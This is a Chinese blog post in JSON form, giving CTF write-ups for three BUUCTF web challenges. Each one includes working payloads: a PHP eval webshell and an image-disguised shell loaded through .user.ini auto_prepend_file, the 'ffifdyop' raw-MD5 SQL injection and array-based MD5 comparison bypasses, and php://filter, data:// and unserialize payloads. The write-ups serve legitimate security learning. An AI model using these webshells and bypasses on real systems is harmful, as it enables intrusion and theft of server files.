{"title":"buu-web零碎2.0","slug":"buu-web零碎2-0","date":"2021-02-06T03:03:45.000Z","updated":"2021-02-06T09:55:22.680Z","comments":true,"path":"api/articles/buu-web零碎2-0.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<h2 id=\"SUCTF-2019-CheckIn\"><a href=\"#SUCTF-2019-CheckIn\" class=\"headerlink\" title=\"[SUCTF 2019]CheckIn\"></a>[SUCTF 2019]CheckIn</h2><p>（…user.ini的利用<br>上传user.ini进行上传后门。  ）<br>文件上传，先尝试  shell.txt  </p>\n<pre><code>&lt;?php @eval($_POST[&#39;shell&#39;]) ?&gt;  </code></pre>\n<p>显示 &lt;? in contents!，即对&lt;?进行了过滤，<br>一句话木马换个形式：  </p>\n<pre><code>&lt;script language=&#39;php&#39;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;  </code></pre>\n<p>报错显示 exif_imagetype:not image!<br>（exif_imagetype() 读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。）<br>简单来说就是根据文件头来判断文件的类型<br>下边说下常见的几种类型<br>1.JPG:FFD8FFFE00<br>2.GIF89a:474946383961<br>3.PNG:89504E470D0A<br>然后对一句话木马前加了GIF的文件头发现还是不行，能上传成功，但是是把他当做图片处理了而不是一个文件。<br>于是找大佬们的WP  </p>\n<p>需要用到.user.ini<br>指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./a.jpg);<br>涉及到两个设置：auto_prepend_file和auto_append_file<br>这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）  </p>\n<p>可以上传一个.user.ini 文件，当我们对目录中的任何php文件进行访问时，都会调用.user.ini中指的文件以php的形式进行读取。<br>所以我们写一个.user.ini进行上传。（一定要加文件幻术头）  </p>\n<pre><code>GIF89a\nauto_prepend_file=text.jpg  </code></pre>\n<p>将text.jpg包含到要执行的php文件中</p>\n<p>先上传.user.ini文件.然后再建立text.jpg文件（图片马)  </p>\n<pre><code>GIF89a\n&lt;script language=&#39;php&#39;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;</code></pre>\n<p>然后直接访问目录得到flag  </p>\n<hr>\n<h2 id=\"BJDCTF2020-Easy-MD5\"><a href=\"#BJDCTF2020-Easy-MD5\" class=\"headerlink\" title=\"[BJDCTF2020]Easy MD5\"></a>[BJDCTF2020]Easy MD5</h2><p>打开一看啥也没，像是注入题，输1抓包，放包，在请求头里有提示：  </p>\n<ul>\n<li>Hint: select * from ‘admin’ where password=md5($pass,true)<br>要考察md5($password,true)的用法:  </li>\n</ul>\n<p>当md5后的hex转换成字符串后，如果包含’or’这样的字符串，整个sql变成：  </p>\n<pre><code>SELECT * FROM admin WHERE pass = &#39;&#39;or&#39;6&lt;trash&gt;&#39;  </code></pre>\n<p>就可以注入<br>提供一个字符串：ffifdyop<br>md5后：276f722736c95d99e921722cf9ed621c<br>再转成字符：’or’6  </p>\n<ul>\n<li>所以 password=ffifdyop </li>\n</ul>\n<p>放包出现</p>\n<pre><code>&lt;script&gt;window.location.replace(&#39;./levels91.php&#39;)&lt;/script&gt;</code></pre>\n<p>访问/levels91.php<br>看源码  </p>\n<pre><code>&lt;!--\n$a = $GET[&#39;a&#39;];\n$b = $_GET[&#39;b&#39;];\n\nif($a != $b &amp;&amp; md5($a) == md5($b))&#123;\n// wow, glzjin wants a girl friend.\n--&gt;</code></pre>\n<p>a和b值不相等，但他们对应的MD5值相等  </p>\n<ul>\n<li><p>数组弱类型比较，用‘a[]=1&amp;b[]2’绕过<br>得代码：  </p>\n  <?php\n  error_reporting(0);\n  include \"flag.php\";\n\n  highlight_file(__FILE__);\n\n  if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){\n  echo $flag;\n  }\n构造param1[]=1&param2[]=2</li>\n<li><p>和上面的如出一辙，不同的是上面是get传参，这个要用到post传参，用火狐，得出flag</p>\n</li>\n</ul>\n<hr>\n<h2 id=\"ZJCTF-2019-NiZhuanSiWei\"><a href=\"#ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"[ZJCTF 2019]NiZhuanSiWei\"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>逆转思维（哦哦）<br>这个题考察php伪协议</p>\n<pre><code>&lt;?php  \n$text = $_GET[&quot;text&quot;];\n$file = $_GET[&quot;file&quot;];\n$password = $_GET[&quot;password&quot;];\nif(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123;\necho &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;\nif(preg_match(&quot;/flag/&quot;,$file))&#123;\n    echo &quot;Not now!&quot;;\n    exit(); \n&#125;else&#123;\n    include($file);  //useless.php\n    $password = unserialize($password);\n    echo $password;\n&#125;\n&#125;\nelse&#123;\n    highlight_file(__FILE__);\n&#125;\n?&gt;  </code></pre>\n<p>file_get_contents()函数把整个文件读入一个字符串中。</p>\n<p>if(isset($text)&amp;&amp;(file_get_contents($text,’r’)===”welcome to the zjctf”))<br>需要传入text且其内容为welcome to the zjctf，利用data协议：（先将传入内容转化为Base64）    </p>\n<pre><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=  </code></pre>\n<p>include($file);处可利用利用 php 流 filter：读取提示useless.php文件内容<br>用base64读取useless.php</p>\n<pre><code>file=php://filter/read=convert.base64-encode/resource=useless.php  </code></pre>\n<p>解码后得到：  </p>\n<pre><code>&lt;?php  \n\nclass Flag&#123;  //flag.php  \n    public $file;  \n    public function __tostring()&#123;  \n        if(isset($this-&gt;file))&#123;  \n            echo file_get_contents($this-&gt;file); \n            echo &quot;&lt;br&gt;&quot;;\n        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);\n        &#125;  \n    &#125;  \n&#125;  \n?&gt;    </code></pre>\n<p>在本地进行序列化得到结果  </p>\n<pre><code>&lt;?php\n\nclass Flag&#123;\npublic $file=&#39;flag.php&#39;;  \n    public function __tostring()&#123;  \n        if(isset($this-&gt;file))&#123;  \n            echo file_get_contents($this-&gt;file); \n            echo &quot;&lt;br&gt;&quot;;\n        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);\n        &#125;  \n    &#125;  \n&#125; \n$password=new Flag();\necho serialize($password);\n?&gt;</code></pre>\n<p>得到结果为：O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}<br>最终payload:</p>\n<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; </code></pre>\n","categories":[],"tags":[{"name":"buu-16-30","slug":"buu-16-30","count":1,"path":"api/tags/buu-16-30.json"}]}